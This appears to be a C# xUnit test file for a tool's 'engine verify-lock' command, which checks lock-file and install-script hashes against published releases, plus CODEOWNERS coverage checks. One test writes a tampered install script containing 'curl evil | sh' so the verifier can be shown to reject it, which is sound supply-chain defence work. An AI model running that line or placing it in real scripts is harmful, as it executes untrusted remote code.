using System.IO.Compression;
using System.Text;
using Lockflight.Cli.Doctor;
using Lockflight.Cli.EngineLocks;
using Lockflight.Cli.Hosting;

namespace Lockflight.Cli.Tests.EngineLocks;

public sealed class VerifyLockTests : IDisposable
{
    private const string Version = "0.0.0-ci.7";

    /// <summary>The SHA-256 of <see cref="ScriptText"/>, the stand-in install script.</summary>
    private const string Script = "5f4d551babaafb59dc80d94b1a3c2d5c97471e78a10c00263743b1b5678e0ef2";

    private const string ScriptText = "install\n";

    private readonly DirectoryInfo work = Directory.CreateTempSubdirectory("lockflight-verify-lock-");

    [Fact]
    public async Task ALockThatMatchesItsReleaseIsSaidToMatchIt()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => Hash(rid));

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed], "", work.FullName);

        Assert.Equal(ExitCode.Pass, exitCode);
        Assert.Contains("matches the published hashes of release v0.0.0-ci.7", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ALockWithAnotherHashThanItsReleaseFails()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => rid == "win-x64" ? new string('0', 64) : Hash(rid));

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed], "", work.FullName);

        Assert.Equal(ExitCode.Fail, exitCode);
        Assert.Contains("its hashes for win-x64 are not the ones release v0.0.0-ci.7 published", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ALockWhoseInstallScriptIsNotTheReleasesFails()
    {
        WriteRelease(rid => Hash(rid), script: new string('e', 64));
        string lockFile = WriteLock(rid => Hash(rid));

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed], "", work.FullName);

        Assert.Equal(ExitCode.Fail, exitCode);
        Assert.Contains("its install script hash is not the one release v0.0.0-ci.7 published", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task AReleaseThatPublishedNoInstallScriptHashCannotVouchForTheLock()
    {
        WriteRelease(rid => Hash(rid), script: null);
        string lockFile = WriteLock(rid => Hash(rid));

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed], "", work.FullName);

        Assert.Equal(ExitCode.Fail, exitCode);
        Assert.Contains("published no install script hash", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ALockThatMovesTheEngineDownIsNamedAsADowngrade()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => Hash(rid));
        string baseLock = WriteLock(rid => Hash(rid), Path.Combine(work.FullName, "base.lock"), version: "0.0.0-ci.9");

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed, "--base", baseLock], "", work.FullName);

        Assert.Equal(ExitCode.Pass, exitCode);
        Assert.Contains("warning: it moves the engine down from 0.0.0-ci.9 to 0.0.0-ci.7", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ALockThatNamesAPlatformTwiceIsUnreadable()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => Hash(rid));
        string text = File.ReadAllText(lockFile);
        File.WriteAllText(lockFile, text.Replace("\"linux-x64\": {", $"\"linux-x64\": {{ \"sha256\": \"{new string('f', 64)}\" }},\n    \"linux-x64\": {{", StringComparison.Ordinal));

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed], "", work.FullName);

        Assert.Equal(ExitCode.Fail, exitCode);
        Assert.Contains("the key 'binaries.linux-x64' appears twice", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task TheVendoredScriptTheLockPinsMatches()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => Hash(rid));
        string script = Path.Combine(work.FullName, "install.sh");
        File.WriteAllText(script, ScriptText);

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed, "--script", script], "", work.FullName);

        Assert.Equal(ExitCode.Pass, exitCode);
        Assert.Contains(".lockflight/ci/install.sh is the script the lock pins", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task AVendoredScriptThatIsNotTheOneTheLockPinsFails()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => Hash(rid));
        string script = Path.Combine(work.FullName, "install.sh");
        File.WriteAllText(script, "curl evil | sh\n");

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed, "--script", script], "", work.FullName);

        Assert.Equal(ExitCode.Fail, exitCode);
        Assert.Contains(".lockflight/ci/install.sh is not the script the lock pins", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task AnUnreadableBaseLockIsNamed()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => Hash(rid));
        string baseLock = Path.Combine(work.FullName, "base.lock");
        File.WriteAllText(baseLock, "{ \"schema\": \"lockflight.engine-lock/v9\" }");

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed, "--base", baseLock], "", work.FullName);

        Assert.Equal(ExitCode.Pass, exitCode);
        Assert.Contains("warning: the base's lock cannot be read", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ALockWithABackslashIsUnreadable()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => Hash(rid));
        string text = File.ReadAllText(lockFile);
        File.WriteAllText(lockFile, text.Replace("\"binaries\": {", "\"\\binaries\": {},\n  \"binaries\": {", StringComparison.Ordinal));

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed], "", work.FullName);

        Assert.Equal(ExitCode.Fail, exitCode);
        Assert.Contains("the lock holds a backslash", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ALockForAVersionWithoutAReleaseFails()
    {
        string lockFile = WriteLock(rid => Hash(rid));

        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed], "", work.FullName);

        Assert.Equal(ExitCode.Fail, exitCode);
        Assert.Contains("no published hashes for 0.0.0-ci.7", output, StringComparison.Ordinal);
    }

    [Fact]
    public async Task AnAttestationThatDoesNotVerifyFails()
    {
        WriteRelease(rid => Hash(rid));
        string lockFile = WriteLock(rid => Hash(rid));

        LockReleaseCheck check = await LockReleaseCheck.RunAsync(
            File.ReadAllText(lockFile), null, new EnginePackageFeed(Feed, EnvironmentReader.Of(new Dictionary<string, string>())),
            (_, _, _, _) => Task.FromResult(new Lockflight.Cli.Processes.ProcessResult(1, string.Empty, "no attestations found", 0, TimedOut: false)),
            TestContext.Current.CancellationToken);

        Assert.Equal(LockReleaseVerdict.Unattested, check.Verdict);
        Assert.Contains("matches the published hashes", check.Detail, StringComparison.Ordinal);
    }

    [Fact]
    public void CodeownersThatCoverTheLockTheManifestAndTheCiFilesPass()
    {
        WriteProject("/lockflight.yaml @team/leads\n/.lockflight/ @team/leads\n/.github/ @team/leads\n");

        DoctorCheck check = CodeownersCheck.Check(work.FullName)!;

        Assert.Equal(CheckStatus.Pass, check.Status);
        Assert.Contains("Require review from Code Owners", check.Detail, StringComparison.Ordinal);
    }

    [Fact]
    public void CodeownersThatMissTheLockAreAWarningNamingIt()
    {
        WriteProject("lockflight.yaml @team/leads\n.github/ @team/leads\n/.lockflight/engine.lock\n");

        DoctorCheck check = CodeownersCheck.Check(work.FullName)!;

        Assert.Equal(CheckStatus.Warn, check.Status);
        Assert.Contains(".lockflight/engine.lock", check.Detail, StringComparison.Ordinal);
        Assert.Contains(".lockflight/ci/install.sh", check.Detail, StringComparison.Ordinal);
    }

    [Fact]
    public void NoCodeownersIsAWarning()
    {
        WriteProject(codeowners: null);

        Assert.Equal(CheckStatus.Warn, CodeownersCheck.Check(work.FullName)!.Status);
    }

    public void Dispose() => TempDirectories.DeleteRecursively(work);

    private string Feed => Path.Combine(work.FullName, "feed");

    private static string Hash(string rid) => Convert.ToHexStringLower(System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes(rid)));

    private void WriteProject(string? codeowners)
    {
        File.WriteAllText(Path.Combine(work.FullName, "lockflight.yaml"), "version: 2\n");
        WriteLock(rid => Hash(rid), EngineLockFiles.CommittedPath(work.FullName));
        Directory.CreateDirectory(Path.Combine(work.FullName, ".github", "workflows"));
        File.WriteAllText(Path.Combine(work.FullName, ".github", "workflows", "lockflight-gates.yml"), "name: x\n");
        if (codeowners is not null)
        {
            File.WriteAllText(Path.Combine(work.FullName, ".github", "CODEOWNERS"), codeowners);
        }
    }

    private string WriteLock(Func<string, string> hash, string? path = null, string version = Version)
    {
        path ??= Path.Combine(work.FullName, "proposed.lock");
        EngineLockFiles.Write(path, new EngineLock(version, EngineLockChannel.Release, Script, EngineRids.Released.ToDictionary(rid => rid, hash, StringComparer.Ordinal)));
        return path;
    }

    private void WriteRelease(Func<string, string> hash, string? script = Script)
    {
        string scriptEntry = script is null ? string.Empty : $$""", "installScript": { "sha256": "{{script}}" }""";
        string binaries = string.Join(", ", EngineRids.Released.Select(rid => $"\"{rid}\": {{ \"sha256\": \"{hash(rid)}\", \"path\": \"tools/any/{rid}/{EngineRids.ExecutableName(rid)}\" }}"));
        string package = Path.Combine(Feed, "lockflight.cli", Version, $"lockflight.cli.{Version}.nupkg");
        Directory.CreateDirectory(Path.GetDirectoryName(package)!);
        using ZipArchive archive = ZipFile.Open(package, ZipArchiveMode.Create);
        using Stream entry = archive.CreateEntry(EngineHashes.FileName).Open();
        entry.Write(Encoding.UTF8.GetBytes($$"""{ "schema": "lockflight.engine-hashes/v1", "package": "Lockflight.Cli", "version": "{{Version}}", "commit": "{{new string('1', 40)}}", "binaries": { {{binaries}} }{{scriptEntry}} }"""));
    }
}
